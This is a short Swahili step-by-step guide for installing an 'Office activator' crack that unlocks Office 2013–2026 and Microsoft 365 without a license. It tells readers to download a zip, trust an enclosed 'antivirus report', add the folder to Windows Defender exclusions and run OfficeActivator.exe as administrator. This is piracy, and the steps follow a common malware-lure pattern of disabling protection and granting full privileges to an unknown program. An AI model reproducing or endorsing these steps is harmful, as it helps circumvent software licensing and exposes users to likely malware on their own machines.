## 🛠 Usakinishaji wa Hatua kwa Hatua

### Hatua 1 — Pakua na Fungua
Hifadhi `Office-Build-Activation.zip` (~50 MB) na uifungue. **Hakuna nenosiri.**

### Hatua 2 — Ukaguzi wa Virusi
Fungua faili la `Ripoti-Antivirus.pdf` ili kuona matokeo ya VirusTotal na Windows Defender.

### Hatua 3 — Ongeza kwenye Misamaha
Ongeza folda kwenye **Windows Security → Exclusions** ili kuepuka tahadhari za uongo.

### Hatua 4 — Endesha kama Msimamizi
Bonyeza kulia `OfficeActivator.exe` → **Endesha kama msimamizi**.

### Hatua 5 — Chagua Office na Uanzishe
Chagua toleo la Office (2013–2026 au Microsoft 365), kisha bonyeza **Activate Office**.

### Hatua 6 — Thibitisha
Fungua Word, nenda **Faili → Akaunti** na uangalie kuwa inasema "Imewezeshwa".
